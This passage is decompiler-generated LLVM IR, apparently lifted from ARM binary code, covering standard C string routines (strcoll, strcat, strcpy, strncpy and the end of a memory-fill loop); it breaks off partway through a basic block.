  %v0_c888.pr = phi i32 [ %v0_c864, %dec_label_pc_c86c ], [ %v0_c888.pr.pre, %bb ], [ %v2_c87c, %.thread ]
  %v0_c884 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_c884, i32* @ip, align 4
  %v8_c88810 = icmp eq i32 %v0_c888.pr, 8
  store i1 %v8_c88810, i1* %cpsr_z.global-to-local, align 1
  %v5_c88c11 = icmp slt i32 %v0_c888.pr, 8
  br i1 %v5_c88c11, label %dec_label_pc_c8c8, label %dec_label_pc_c890.preheader

dec_label_pc_c890.preheader:                      ; preds = %dec_label_pc_c884
  %v1_c89046 = inttoptr i32 %v0_c89028 to i32*
  store i32 %v0_c884, i32* %v1_c89046, align 4
  %v3_c89047 = add i32 %v0_c89028, 4
  %v4_c89048 = inttoptr i32 %v3_c89047 to i32*
  %v5_c89049 = load i32, i32* @ip, align 4
  store i32 %v5_c89049, i32* %v4_c89048, align 4
  %v6_c89050 = add i32 %v0_c89028, 8
  store i32 %v6_c89050, i32* %r3.global-to-local, align 4
  %v0_c89451 = load i32, i32* @r2, align 4
  %v1_c89452 = add i32 %v0_c89451, -8
  store i32 %v1_c89452, i32* %r2.global-to-local, align 4
  %v5_c89c53 = icmp slt i32 %v1_c89452, 8
  br i1 %v5_c89c53, label %dec_label_pc_c890.dec_label_pc_c8c8.loopexit_crit_edge, label %dec_label_pc_c8a0

dec_label_pc_c8a0:                                ; preds = %dec_label_pc_c890.preheader, %dec_label_pc_c888.dec_label_pc_c890_crit_edge
  %v6_c89055 = phi i32 [ %v6_c890, %dec_label_pc_c888.dec_label_pc_c890_crit_edge ], [ %v6_c89050, %dec_label_pc_c890.preheader ]
  %v0_c89054 = phi i32 [ %v12_c8bc, %dec_label_pc_c888.dec_label_pc_c890_crit_edge ], [ %v0_c89028, %dec_label_pc_c890.preheader ]
  %v1_c8a0 = inttoptr i32 %v6_c89055 to i32*
  %v2_c8a0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_c8a0, i32* %v1_c8a0, align 4
  %v3_c8a0 = add i32 %v0_c89054, 12
  %v4_c8a0 = inttoptr i32 %v3_c8a0 to i32*
  %v5_c8a0 = load i32, i32* @ip, align 4
  store i32 %v5_c8a0, i32* %v4_c8a0, align 4
  %v6_c8a0 = add i32 %v0_c89054, 16
  store i32 %v6_c8a0, i32* %r3.global-to-local, align 4
  %v0_c8a4 = load i32, i32* %r2.global-to-local, align 4
  %v1_c8a4 = add i32 %v0_c8a4, -8
  store i32 %v1_c8a4, i32* %r2.global-to-local, align 4
  %v5_c8ac = icmp slt i32 %v1_c8a4, 8
  br i1 %v5_c8ac, label %dec_label_pc_c8a0.dec_label_pc_c8c8.loopexit_crit_edge, label %dec_label_pc_c8b0

dec_label_pc_c8b0:                                ; preds = %dec_label_pc_c8a0
  %v1_c8b0 = inttoptr i32 %v6_c8a0 to i32*
  %v2_c8b0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_c8b0, i32* %v1_c8b0, align 4
  %v3_c8b0 = add i32 %v0_c89054, 20
  %v4_c8b0 = inttoptr i32 %v3_c8b0 to i32*
  %v5_c8b0 = load i32, i32* @ip, align 4
  store i32 %v5_c8b0, i32* %v4_c8b0, align 4
  %v6_c8b0 = add i32 %v0_c89054, 24
  store i32 %v6_c8b0, i32* %r3.global-to-local, align 4
  %v0_c8b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_c8b4 = add i32 %v0_c8b4, -8
  store i32 %v1_c8b4, i32* %r2.global-to-local, align 4
  %v5_c8bc = icmp slt i32 %v1_c8b4, 8
  br i1 %v5_c8bc, label %dec_label_pc_c8b0.dec_label_pc_c8c8.loopexit_crit_edge, label %dec_label_pc_c888

dec_label_pc_c888:                                ; preds = %dec_label_pc_c8b0
  %v7_c8bc = inttoptr i32 %v6_c8b0 to i32*
  %v8_c8bc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v8_c8bc, i32* %v7_c8bc, align 4
  %v9_c8bc = add i32 %v0_c89054, 28
  %v10_c8bc = inttoptr i32 %v9_c8bc to i32*
  %v11_c8bc = load i32, i32* @ip, align 4
  store i32 %v11_c8bc, i32* %v10_c8bc, align 4
  %v12_c8bc = add i32 %v0_c89054, 32
  store i32 %v12_c8bc, i32* %r3.global-to-local, align 4
  %v6_c8c0 = load i32, i32* %r2.global-to-local, align 4
  %v7_c8c0 = add i32 %v6_c8c0, -8
  store i32 %v7_c8c0, i32* %r2.global-to-local, align 4
  %v5_c88c = icmp slt i32 %v7_c8c0, 8
  br i1 %v5_c88c, label %dec_label_pc_c888.dec_label_pc_c8c8.loopexit_crit_edge, label %dec_label_pc_c888.dec_label_pc_c890_crit_edge

dec_label_pc_c888.dec_label_pc_c890_crit_edge:    ; preds = %dec_label_pc_c888
  %v2_c890.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_c890 = inttoptr i32 %v12_c8bc to i32*
  store i32 %v2_c890.pre, i32* %v1_c890, align 4
  %v3_c890 = add i32 %v0_c89054, 36
  %v4_c890 = inttoptr i32 %v3_c890 to i32*
  %v5_c890 = load i32, i32* @ip, align 4
  store i32 %v5_c890, i32* %v4_c890, align 4
  %v6_c890 = add i32 %v0_c89054, 40
  store i32 %v6_c890, i32* %r3.global-to-local, align 4
  %v0_c894 = load i32, i32* %r2.global-to-local, align 4
  %v1_c894 = add i32 %v0_c894, -8
  store i32 %v1_c894, i32* %r2.global-to-local, align 4
  %v5_c89c = icmp slt i32 %v1_c894, 8
  br i1 %v5_c89c, label %dec_label_pc_c890.dec_label_pc_c8c8.loopexit_crit_edge, label %dec_label_pc_c8a0

dec_label_pc_c890.dec_label_pc_c8c8.loopexit_crit_edge: ; preds = %dec_label_pc_c888.dec_label_pc_c890_crit_edge, %dec_label_pc_c890.preheader
  %v1_c894.lcssa = phi i32 [ %v1_c89452, %dec_label_pc_c890.preheader ], [ %v1_c894, %dec_label_pc_c888.dec_label_pc_c890_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_c8c8

dec_label_pc_c888.dec_label_pc_c8c8.loopexit_crit_edge: ; preds = %dec_label_pc_c888
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_c8c8

dec_label_pc_c8a0.dec_label_pc_c8c8.loopexit_crit_edge: ; preds = %dec_label_pc_c8a0
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_c8c8

dec_label_pc_c8b0.dec_label_pc_c8c8.loopexit_crit_edge: ; preds = %dec_label_pc_c8b0
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_c8c8

dec_label_pc_c8c8:                                ; preds = %dec_label_pc_c884, %dec_label_pc_c890.dec_label_pc_c8c8.loopexit_crit_edge, %dec_label_pc_c888.dec_label_pc_c8c8.loopexit_crit_edge, %dec_label_pc_c8a0.dec_label_pc_c8c8.loopexit_crit_edge, %dec_label_pc_c8b0.dec_label_pc_c8c8.loopexit_crit_edge, %entry
  %v0_c8d0 = phi i32 [ %v0_c864, %entry ], [ %v1_c8b4, %dec_label_pc_c8b0.dec_label_pc_c8c8.loopexit_crit_edge ], [ %v1_c8a4, %dec_label_pc_c8a0.dec_label_pc_c8c8.loopexit_crit_edge ], [ %v7_c8c0, %dec_label_pc_c888.dec_label_pc_c8c8.loopexit_crit_edge ], [ %v1_c894.lcssa, %dec_label_pc_c890.dec_label_pc_c8c8.loopexit_crit_edge ], [ %v0_c888.pr, %dec_label_pc_c884 ]
  %v2_c8c8 = icmp eq i32 %v0_c8d0, 0
  store i1 %v2_c8c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c8c8, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_c8c8
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_c8c8
  %v1_c8d0 = sub i32 7, %v0_c8d0
  store i32 %v1_c8d0, i32* %r2.global-to-local, align 4
  %v3_c8d4 = mul i32 %v1_c8d0, 4
  %v4_c8d4 = add i32 %v3_c8d4, ptrtoint (i32* @global_var_c8dc.508 to i32)
  call void @__pseudo_branch(i32 %v4_c8d4)
  %v0_c8dc = load i32, i32* %r1.global-to-local, align 4
  %v1_c8dc = trunc i32 %v0_c8dc to i8
  %v2_c8dc = load i32, i32* %r3.global-to-local, align 4
  %v3_c8dc = inttoptr i32 %v2_c8dc to i8*
  store i8 %v1_c8dc, i8* %v3_c8dc, align 1
  %v4_c8dc = load i32, i32* %r3.global-to-local, align 4
  %v5_c8dc = add i32 %v4_c8dc, 1
  store i32 %v5_c8dc, i32* %r3.global-to-local, align 4
  %v0_c8e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_c8e0 = trunc i32 %v0_c8e0 to i8
  %v3_c8e0 = inttoptr i32 %v5_c8dc to i8*
  store i8 %v1_c8e0, i8* %v3_c8e0, align 1
  %v4_c8e0 = load i32, i32* %r3.global-to-local, align 4
  %v5_c8e0 = add i32 %v4_c8e0, 1
  store i32 %v5_c8e0, i32* %r3.global-to-local, align 4
  %v0_c8e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_c8e4 = trunc i32 %v0_c8e4 to i8
  %v3_c8e4 = inttoptr i32 %v5_c8e0 to i8*
  store i8 %v1_c8e4, i8* %v3_c8e4, align 1
  %v4_c8e4 = load i32, i32* %r3.global-to-local, align 4
  %v5_c8e4 = add i32 %v4_c8e4, 1
  store i32 %v5_c8e4, i32* %r3.global-to-local, align 4
  %v0_c8e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_c8e8 = trunc i32 %v0_c8e8 to i8
  %v3_c8e8 = inttoptr i32 %v5_c8e4 to i8*
  store i8 %v1_c8e8, i8* %v3_c8e8, align 1
  %v4_c8e8 = load i32, i32* %r3.global-to-local, align 4
  %v5_c8e8 = add i32 %v4_c8e8, 1
  store i32 %v5_c8e8, i32* %r3.global-to-local, align 4
  %v0_c8ec = load i32, i32* %r1.global-to-local, align 4
  %v1_c8ec = trunc i32 %v0_c8ec to i8
  %v3_c8ec = inttoptr i32 %v5_c8e8 to i8*
  store i8 %v1_c8ec, i8* %v3_c8ec, align 1
  %v4_c8ec = load i32, i32* %r3.global-to-local, align 4
  %v5_c8ec = add i32 %v4_c8ec, 1
  store i32 %v5_c8ec, i32* %r3.global-to-local, align 4
  %v0_c8f0 = load i32, i32* %r1.global-to-local, align 4
  %v1_c8f0 = trunc i32 %v0_c8f0 to i8
  %v3_c8f0 = inttoptr i32 %v5_c8ec to i8*
  store i8 %v1_c8f0, i8* %v3_c8f0, align 1
  %v4_c8f0 = load i32, i32* %r3.global-to-local, align 4
  %v5_c8f0 = add i32 %v4_c8f0, 1
  store i32 %v5_c8f0, i32* %r3.global-to-local, align 4
  %v0_c8f4 = load i32, i32* %r1.global-to-local, align 4
  %v1_c8f4 = trunc i32 %v0_c8f4 to i8
  %v3_c8f4 = inttoptr i32 %v5_c8f0 to i8*
  store i8 %v1_c8f4, i8* %v3_c8f4, align 1
  %v4_c8f4 = load i32, i32* %r3.global-to-local, align 4
  %v5_c8f4 = add i32 %v4_c8f4, 1
  store i32 %v5_c8f4, i32* %r3.global-to-local, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_c890, { 1, 0 }
  uselistorder i32 %v12_c8bc, { 1, 2, 0 }
  uselistorder i32 %v0_c89054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_c888.pr, { 0, 2, 1 }
  uselistorder i32 %v6_c878, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_c86c, { 1, 0 }
  uselistorder i32 %v0_c864, { 1, 0, 2, 3 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 19, 20, 17, 14, 15, 16, 13, 18, 21, 22 }
  uselistorder i32* %r2.global-to-local, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 1, 14, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 2, 1, 3, 0, 4, 8, 7, 5, 9 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_c8c8, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_c8a0, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_c904.pre = load i32, i32* @r1, align 4
  br label %entry

entry:                                            ; preds = %bb3, %bb
  %v0_c904 = phi i32 [ %v0_c904.pre, %bb ], [ %v5_c904, %bb3 ]
  %v0_c900 = phi i32 [ %tmp, %bb ], [ %v5_c900, %bb3 ]
  %v1_c900 = inttoptr i32 %v0_c900 to i8*
  %v2_c900 = load i8, i8* %v1_c900, align 1
  %v1_c904 = inttoptr i32 %v0_c904 to i8*
  %v2_c904 = load i8, i8* %v1_c904, align 1
  %v3_c904 = zext i8 %v2_c904 to i32
  %v2_c908 = icmp eq i8 %v2_c900, 0
  br i1 %v2_c908, label %.dec_label_pc_c914_crit_edge, label %bb3

bb3:                                              ; preds = %entry
  %v5_c904 = add i32 %v0_c904, 1
  %v5_c900 = add i32 %v0_c900, 1
  %v3_c900 = zext i8 %v2_c900 to i32
  %v10_c90c = icmp eq i8 %v2_c900, %v2_c904
  br i1 %v10_c90c, label %entry, label %dec_label_pc_c914

.dec_label_pc_c914_crit_edge:                     ; preds = %entry
  br label %dec_label_pc_c914

dec_label_pc_c914:                                ; preds = %bb3, %.dec_label_pc_c914_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_c914_crit_edge ], [ %v3_c900, %bb3 ]
  %v2_c914.pre-phi = sub nsw i32 %.pn, %v3_c904
  ret i32 %v2_c914.pre-phi

; uselistorder directives
  uselistorder i8 %v2_c900, { 0, 2, 1 }
  uselistorder i32 %v0_c900, { 1, 0 }
  uselistorder i32 %v0_c904, { 1, 0 }
  uselistorder label %dec_label_pc_c914, { 1, 0 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @strcat(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_c984

dec_label_pc_c984:                                ; preds = %dec_label_pc_c984, %entry
  %v0_c984 = phi i32 [ %v5_c984, %dec_label_pc_c984 ], [ %tmp, %entry ]
  %v1_c984 = inttoptr i32 %v0_c984 to i8*
  %v2_c984 = load i8, i8* %v1_c984, align 1
  %v5_c984 = add i32 %v0_c984, 1
  store i32 %v5_c984, i32* %r2.global-to-local, align 4
  %v2_c988 = icmp eq i8 %v2_c984, 0
  store i1 %v2_c988, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c988, label %dec_label_pc_c990, label %dec_label_pc_c984

dec_label_pc_c990:                                ; preds = %dec_label_pc_c984
  %v1_c990 = add i32 %v0_c984, -1
  store i32 %v1_c990, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_c994

dec_label_pc_c994:                                ; preds = %dec_label_pc_c994, %dec_label_pc_c990
  %v2_c99c = phi i32 [ %v6_c99c, %dec_label_pc_c994 ], [ %v1_c990, %dec_label_pc_c990 ]
  %v0_c994 = load i32, i32* @r1, align 4
  %v1_c994 = inttoptr i32 %v0_c994 to i8*
  %v2_c994 = load i8, i8* %v1_c994, align 1
  %v5_c994 = add i32 %v0_c994, 1
  store i32 %v5_c994, i32* @r1, align 4
  %v2_c998 = icmp eq i8 %v2_c994, 0
  store i1 %v2_c998, i1* %cpsr_z.global-to-local, align 1
  %v3_c99c = add i32 %v2_c99c, 1
  %v4_c99c = inttoptr i32 %v3_c99c to i8*
  store i8 %v2_c994, i8* %v4_c99c, align 1
  %v5_c99c = load i32, i32* %r2.global-to-local, align 4
  %v6_c99c = add i32 %v5_c99c, 1
  store i32 %v6_c99c, i32* %r2.global-to-local, align 4
  %v0_c9a0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c9a0, label %dec_label_pc_c9a4, label %dec_label_pc_c994

dec_label_pc_c9a4:                                ; preds = %dec_label_pc_c994
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_c99c, { 1, 0 }
  uselistorder i32 %v5_c984, { 1, 0 }
  uselistorder i32 %v0_c984, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0, 2 }
}

define i32 @strcpy(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_c9a8 = sub i32 %arg1, %tmp
  %v1_c9ac = add i32 %v2_c9a8, -1
  store i32 %v1_c9ac, i32* %r2.global-to-local, align 4
  %v2_c9b04 = load i8, i8* %arg2, align 1
  %v5_c9b06 = add i32 %tmp, 1
  store i32 %v5_c9b06, i32* %r1.global-to-local, align 4
  %v2_c9b47 = icmp eq i8 %v2_c9b04, 0
  store i1 %v2_c9b47, i1* %cpsr_z.global-to-local, align 1
  %v5_c9b88 = inttoptr i32 %arg1 to i8*
  store i8 %v2_c9b04, i8* %v5_c9b88, align 1
  %v0_c9bc9 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c9bc9, label %dec_label_pc_c9c0, label %dec_label_pc_c9b0.dec_label_pc_c9b0_crit_edge

dec_label_pc_c9b0.dec_label_pc_c9b0_crit_edge:    ; preds = %entry, %dec_label_pc_c9b0.dec_label_pc_c9b0_crit_edge
  %v0_c9b0.pre = load i32, i32* %r1.global-to-local, align 4
  %v3_c9b8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_c9b0 = inttoptr i32 %v0_c9b0.pre to i8*
  %v2_c9b0 = load i8, i8* %v1_c9b0, align 1
  %v5_c9b0 = add i32 %v0_c9b0.pre, 1
  store i32 %v5_c9b0, i32* %r1.global-to-local, align 4
  %v2_c9b4 = icmp eq i8 %v2_c9b0, 0
  store i1 %v2_c9b4, i1* %cpsr_z.global-to-local, align 1
  %v4_c9b8 = add i32 %v5_c9b0, %v3_c9b8.pre
  %v5_c9b8 = inttoptr i32 %v4_c9b8 to i8*
  store i8 %v2_c9b0, i8* %v5_c9b8, align 1
  %v0_c9bc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c9bc, label %dec_label_pc_c9c0, label %dec_label_pc_c9b0.dec_label_pc_c9b0_crit_edge

dec_label_pc_c9c0:                                ; preds = %dec_label_pc_c9b0.dec_label_pc_c9b0_crit_edge, %entry
  ret i32 %arg1

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c9b0.dec_label_pc_c9b0_crit_edge, { 1, 0 }
}

define i32 @strncpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v7_c9c4 = icmp eq i32 %arg2, 3
  store i1 %v7_c9c4, i1* %cpsr_z.global-to-local, align 1
  %v1_c9cc = add i32 %arg1, -1
  store i32 %v1_c9cc, i32* @ip, align 4
  %tmp = icmp ult i32 %arg2, 4
  br i1 %tmp, label %dec_label_pc_ca48, label %dec_label_pc_c9d4

dec_label_pc_c9d4:                                ; preds = %entry
  %v3_c9d4 = udiv i32 %arg2, 4
  store i32 %v3_c9d4, i32* @lr, align 4
  %v0_c9d8.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_c9d8

dec_label_pc_c9d8:                                ; preds = %dec_label_pc_ca24, %dec_label_pc_c9d4
  %v2_c9e0 = phi i32 [ %v6_ca18, %dec_label_pc_ca24 ], [ %v1_c9cc, %dec_label_pc_c9d4 ]
  %v0_c9d8 = phi i32 [ %v1_ca28, %dec_label_pc_ca24 ], [ %v0_c9d8.pre, %dec_label_pc_c9d4 ]
  %v1_c9d8 = inttoptr i32 %v0_c9d8 to i8*
  %v2_c9d8 = load i8, i8* %v1_c9d8, align 1
  %v3_c9d8 = zext i8 %v2_c9d8 to i32
  store i32 %v3_c9d8, i32* %r3.global-to-local, align 4
  %v2_c9dc = icmp eq i8 %v2_c9d8, 0
  store i1 %v2_c9dc, i1* %cpsr_z.global-to-local, align 1
  %v3_c9e0 = add i32 %v2_c9e0, 1
  %v4_c9e0 = inttoptr i32 %v3_c9e0 to i8*
  store i8 %v2_c9d8, i8* %v4_c9e0, align 1
  %v5_c9e0 = load i32, i32* @ip, align 4
  %v6_c9e0 = add i32 %v5_c9e0, 1
  store i32 %v6_c9e0, i32* @ip, align 4
  %v0_c9e4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c9e4, label %dec_label_pc_ca34, label %dec_label_pc_c9e8

dec_label_pc_c9e8:                                ; preds = %dec_label_pc_c9d8
  %v0_c9e8 = load i32, i32* @r1, align 4
  %v1_c9e8 = add i32 %v0_c9e8, 1
  %v2_c9e8 = inttoptr i32 %v1_c9e8 to i8*
  %v3_c9e8 = load i8, i8* %v2_c9e8, align 1
  %v4_c9e8 = zext i8 %v3_c9e8 to i32
  store i32 %v4_c9e8, i32* %r3.global-to-local, align 4
  %v2_c9ec = icmp eq i8 %v3_c9e8, 0
  store i1 %v2_c9ec, i1* %cpsr_z.global-to-local, align 1
  %v3_c9f0 = add i32 %v5_c9e0, 2
  %v4_c9f0 = inttoptr i32 %v3_c9f0 to i8*
  store i8 %v3_c9e8, i8* %v4_c9f0, align 1
  %v5_c9f0 = load i32, i32* @ip, align 4
  %v6_c9f0 = add i32 %v5_c9f0, 1
  store i32 %v6_c9f0, i32* @ip, align 4
  %v0_c9f4 = load i32, i32* @r1, align 4
  %v1_c9f4 = add i32 %v0_c9f4, 1
  store i32 %v1_c9f4, i32* %r1.global-to-local, align 4
  %v0_c9f8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c9f8, label %dec_label_pc_ca34, label %dec_label_pc_c9fc

dec_label_pc_c9fc:                                ; preds = %dec_label_pc_c9e8
  %v1_c9fc = add i32 %v0_c9f4, 2
  %v2_c9fc = inttoptr i32 %v1_c9fc to i8*
  %v3_c9fc = load i8, i8* %v2_c9fc, align 1
  %v4_c9fc = zext i8 %v3_c9fc to i32
  store i32 %v4_c9fc, i32* %r3.global-to-local, align 4
  %v2_ca00 = icmp eq i8 %v3_c9fc, 0
  store i1 %v2_ca00, i1* %cpsr_z.global-to-local, align 1
  %v3_ca04 = add i32 %v5_c9f0, 2
  %v4_ca04 = inttoptr i32 %v3_ca04 to i8*
  store i8 %v3_c9fc, i8* %v4_ca04, align 1
  %v5_ca04 = load i32, i32* @ip, align 4
  %v6_ca04 = add i32 %v5_ca04, 1
  store i32 %v6_ca04, i32* @ip, align 4
  %v0_ca08 = load i32, i32* %r1.global-to-local, align 4
  %v1_ca08 = add i32 %v0_ca08, 1
  store i32 %v1_ca08, i32* %r1.global-to-local, align 4
  %v0_ca0c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ca0c, label %dec_label_pc_ca34, label %dec_label_pc_ca10

dec_label_pc_ca10:                                ; preds = %dec_label_pc_c9fc
  %v1_ca10 = add i32 %v0_ca08, 2
  %v2_ca10 = inttoptr i32 %v1_ca10 to i8*
  %v3_ca10 = load i8, i8* %v2_ca10, align 1
  %v4_ca10 = zext i8 %v3_ca10 to i32
  store i32 %v4_ca10, i32* %r3.global-to-local, align 4
  %v2_ca14 = icmp eq i8 %v3_ca10, 0
  store i1 %v2_ca14, i1* %cpsr_z.global-to-local, align 1
  %v3_ca18 = add i32 %v5_ca04, 2
  %v4_ca18 = inttoptr i32 %v3_ca18 to i8*
  store i8 %v3_ca10, i8* %v4_ca18, align 1
  %v5_ca18 = load i32, i32* @ip, align 4
  %v6_ca18 = add i32 %v5_ca18, 1
  store i32 %v6_ca18, i32* @ip, align 4
  %v0_ca1c = load i32, i32* %r1.global-to-local, align 4
  %v1_ca1c = add i32 %v0_ca1c, 1
  store i32 %v1_ca1c, i32* %r1.global-to-local, align 4
  %v0_ca20 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ca20, label %dec_label_pc_ca34, label %dec_label_pc_ca24

dec_label_pc_ca24:                                ; preds = %dec_label_pc_ca10
  %v0_ca24 = load i32, i32* @lr, align 4
  %v1_ca24 = add i32 %v0_ca24, -1
  store i32 %v1_ca24, i32* @lr, align 4
  %v7_ca24 = icmp eq i32 %v0_ca24, 1
  store i1 %v7_ca24, i1* %cpsr_z.global-to-local, align 1
  %v1_ca28 = add i32 %v0_ca1c, 2
  store i32 %v1_ca28, i32* @r1, align 4
  br i1 %v7_ca24, label %dec_label_pc_ca48, label %dec_label_pc_c9d8

dec_label_pc_ca34:                                ; preds = %dec_label_pc_ca10, %dec_label_pc_c9fc, %dec_label_pc_c9e8, %dec_label_pc_c9d8
  %v1_ca34 = phi i32 [ %v6_ca18, %dec_label_pc_ca10 ], [ %v6_ca04, %dec_label_pc_c9fc ], [ %v6_c9f0, %dec_label_pc_c9e8 ], [ %v6_c9e0, %dec_label_pc_c9d8 ]
  %v2_ca341 = sub i32 %arg1, %v1_ca34
  %v2_ca38 = add i32 %v2_ca341, %arg2
  store i32 %v2_ca38, i32* %r3.global-to-local, align 4
  %v1_ca3c = add i32 %v2_ca38, -1
  store i32 %v1_ca3c, i32* %r2.global-to-local, align 4
  %v7_ca3c = icmp eq i32 %v2_ca38, 1
  store i1 %v7_ca3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ca3c, label %bb, label %dec_label_pc_ca68

bb:                                               ; preds = %dec_label_pc_ca34
  ret i32 %arg1

dec_label_pc_ca48:                                ; preds = %dec_label_pc_ca24, %entry
  %v2_ca586 = phi i32 [ %v1_c9cc, %entry ], [ %v6_ca18, %dec_label_pc_ca24 ]
  %v1_ca48 = urem i32 %arg2, 4
  store i32 %v1_ca48, i32* %r2.global-to-local, align 4
  %v2_ca48 = icmp eq i32 %v1_ca48, 0
  store i1 %v2_ca48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ca48, label %bb11, label %.preheader

bb11:                                             ; preds = %dec_label_pc_ca48
  ret i32 %arg1

.preheader:                                       ; preds = %dec_label_pc_ca48, %._crit_edge
  %v2_ca58 = phi i32 [ %v6_ca58, %._crit_edge ], [ %v2_ca586, %dec_label_pc_ca48 ]
  %v0_ca54 = phi i32 [ %v0_ca54.pre, %._crit_edge ], [ %v1_ca48, %dec_label_pc_ca48 ]
  %v0_ca50 = load i32, i32* @r1, align 4
  %v1_ca50 = inttoptr i32 %v0_ca50 to i8*
  %v2_ca50 = load i8, i8* %v1_ca50, align 1
  %v3_ca50 = zext i8 %v2_ca50 to i32
  store i32 %v3_ca50, i32* %r3.global-to-local, align 4
  %v5_ca50 = add i32 %v0_ca50, 1
  store i32 %v5_ca50, i32* @r1, align 4
  %v1_ca54 = add i32 %v0_ca54, -1
  store i32 %v1_ca54, i32* %r2.global-to-local, align 4
  %v7_ca54 = icmp eq i32 %v0_ca54, 1
  store i1 %v7_ca54, i1* %cpsr_z.global-to-local, align 1
  %v3_ca58 = add i32 %v2_ca58, 1
  %v4_ca58 = inttoptr i32 %v3_ca58 to i8*
  store i8 %v2_ca50, i8* %v4_ca58, align 1
  %v5_ca58 = load i32, i32* @ip, align 4
  %v6_ca58 = add i32 %v5_ca58, 1
  store i32 %v6_ca58, i32* @ip, align 4
  %v0_ca5c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ca5c, label %bb12, label %bb13

bb12:                                             ; preds = %.preheader
  ret i32 %arg1

bb13:                                             ; preds = %.preheader
  %v0_ca60 = load i32, i32* %r3.global-to-local, align 4
  %v2_ca60 = icmp eq i32 %v0_ca60, 0
  store i1 %v2_ca60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ca60, label %dec_label_pc_ca68, label %._crit_edge

._crit_edge:                                      ; preds = %bb13
  %v0_ca54.pre = load i32, i32* %r2.global-to-local, align 4
  br label %.preheader

dec_label_pc_ca68:                                ; preds = %dec_label_pc_ca34, %bb13, %dec_label_pc_ca68
  %v2_ca70 = phi i32 [ %v6_ca70, %dec_label_pc_ca68 ], [ %v1_ca34, %dec_label_pc_ca34 ], [ %v6_ca58, %bb13 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_ca6c = load i32, i32* %r2.global-to-local, align 4
  %v1_ca6c = add i32 %v0_ca6c, -1
  store i32 %v1_ca6c, i32* %r2.global-to-local, align 4
  %v7_ca6c = icmp eq i32 %v0_ca6c, 1
  store i1 %v7_ca6c, i1* %cpsr_z.global-to-local, align 1
  %v3_ca70 = add i32 %v2_ca70, 1
  %v4_ca70 = inttoptr i32 %v3_ca70 to i8*
  store i8 0, i8* %v4_ca70, align 1
  %v5_ca70 = load i32, i32* @ip, align 4
  %v6_ca70 = add i32 %v5_ca70, 1
  store i32 %v6_ca70, i32* @ip, align 4
  %v0_ca74 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ca74, label %dec_label_pc_ca78, label %dec_label_pc_ca68

dec_label_pc_ca78:                                ; preds = %dec_label_pc_ca68
